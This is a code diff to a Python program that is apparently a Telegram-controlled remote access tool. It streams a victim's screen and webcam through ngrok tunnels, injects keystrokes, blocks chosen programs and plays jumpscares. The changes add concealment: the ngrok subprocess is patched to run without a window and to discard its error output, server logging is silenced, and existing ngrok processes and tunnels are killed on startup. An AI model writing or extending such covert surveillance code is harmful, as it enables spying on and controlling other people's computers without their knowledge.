@@ -52,16 +52,17 @@ from io import BytesIO, StringIO
 from random import choice, randint
 from webbrowser import open as browseropen
 from string import ascii_letters, printable
-from subprocess import CREATE_NO_WINDOW, Popen
+from subprocess import CREATE_NO_WINDOW, DEVNULL, Popen
 from os import system, remove, getenv, getcwd, listdir, name, getlogin, chmod 
 from keyboard import press as press_key, release as release_key, read_event, KEY_DOWN
 from os.path import join, abspath, isfile, exists, dirname, realpath, isdir, split as pathsplit
 
 #TUNNEL HANDLING
-from pyngrok import ngrok
-from http.server import BaseHTTPRequestHandler, HTTPServer
+import pyngrok.process
+from pyngrok import ngrok, conf
+from http.server import HTTPServer
 from socketserver import ThreadingMixIn
-from http.server import SimpleHTTPRequestHandler, HTTPServer
+from http.server import BaseHTTPRequestHandler, HTTPServer
 
 
 def resource_path(relative_path: str) -> str:
@@ -168,6 +169,19 @@ try:
 except Exception as e:
     print(e)
     exit()
+
+def _patched_popen(*args, **kwargs):
+    kwargs["creationflags"] = CREATE_NO_WINDOW
+    kwargs["stderr"] = DEVNULL
+    return Popen(*args, **kwargs)
+
+def close_all_tunnels(ngrok):
+    tunnels = ngrok.get_tunnels()
+    for tunnel in tunnels:
+        try:
+            ngrok.disconnect(tunnel.public_url)
+        except Exception as e:
+            print(f"Failed to disconnect {tunnel.public_url}: {e}")
 
 def randomname(lenght: int=10) -> str:
     return "".join([ choice(ascii_letters) for _ in range(lenght)])
@@ -446,6 +460,12 @@ def pad_to_16_9(image):
         padded = copyMakeBorder(image, 0, 0, pad, new_width - width - pad, BORDER_CONSTANT, value=(0, 0, 0))
     return padded
 
+
+def terminate_process_by_name(process_name: str) -> None:
+    for proc in psutil.process_iter():
+        if proc.name().lower() == process_name.lower().strip():
+                proc.terminate()
+
 """
 oooooooooo.                         oooo                     .oooooo..o                     o8o                 .   
 `888'   `Y8b                        `888                    d8P'    `Y8                     `"'               .o8   
@@ -520,7 +540,12 @@ ooooooooooooo                                               oooo  ooooo   ooooo 
 """
 class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
     daemon_threads = True
+    def handle_error(self, request, client_address):
+        pass
 class ScreenStreamHandler(BaseHTTPRequestHandler):
+    def log_message(self, format, *args):
+        pass
+
     def do_GET(self):
         if self.path != '/':
             self.send_error(404)
@@ -539,6 +564,9 @@ class ScreenStreamHandler(BaseHTTPRequestHandler):
 
 def webcamstreamhandlermaker(cap):
     class WebcamStreamHandler(BaseHTTPRequestHandler):
+        def log_message(self, format, *args):
+            pass
+
         def do_GET(self):
             if self.path != '/':
                 self.send_error(404)
@@ -1013,7 +1041,7 @@ class PeppinoTelegram:
                 "duckyscript": lambda *args: toducky(" ".join(args), execute=True),
                 "capslock": lambda: toducky("CAPSLOCK", execute=True),
                 "randomkeyboard":self.randomkeyboard,
-                "terminateprocess":self.terminate_process_by_name,
+                "terminateprocess":terminate_process_by_name,
                 "setvideowallpaper":self.setvideowallpaper,
                 "id":lambda:self.bsend(f"🆔 CHAT_ID: {self.owner_id}"),
                 "recordjum":self.record_jumpscare_reaction,
@@ -1095,7 +1123,7 @@ class PeppinoTelegram:
             while self.running:
                 for process in self.cantopenlist:
                     if self.check_if_proc_running(process):
-                        self.terminate_process_by_name(process)
+                        terminate_process_by_name(process)
                 sleep(1)
 
         def cantopenmenu(self) -> None:
@@ -1957,11 +1985,6 @@ class PeppinoTelegram:
             self.stop_webcam_tunnel()
             sys.exit()
 
-        def terminate_process_by_name(self, process_name: str) -> None:
-            for proc in psutil.process_iter():
-                if proc.name().lower() == process_name.lower().strip():
-                    proc.terminate()
-
         def update_commands(self) -> bool:
             commands = self.extract_commands()
             url = f'https://api.telegram.org/bot{self.token}/setMyCommands'
@@ -1998,11 +2021,15 @@ ooo        ooooo            o8o
  8    Y     888  d8(  888   888   888   888  
 o8o        o888o `Y888""8o o888o o888o o888o 
 """
+
 if __name__ == "__main__":
     token, chat_id, ngrok_token = getCred() 
     mixer = CustomMixer()
     capture = VideoCapture(0)
     if ngrok_token.strip():
+        terminate_process_by_name("ngrok.exe")
         ngrok.set_auth_token(ngrok_token)
+        close_all_tunnels(ngrok)
+        pyngrok.process.subprocess.Popen = _patched_popen
     pep2 = PeppinoTelegram(token,chat_id,ngrok_token,mixer,capture,loading_bar_set=["█","░"],loading_bar_spinner=all_spinners["circle_dots"])
     pep2.start()
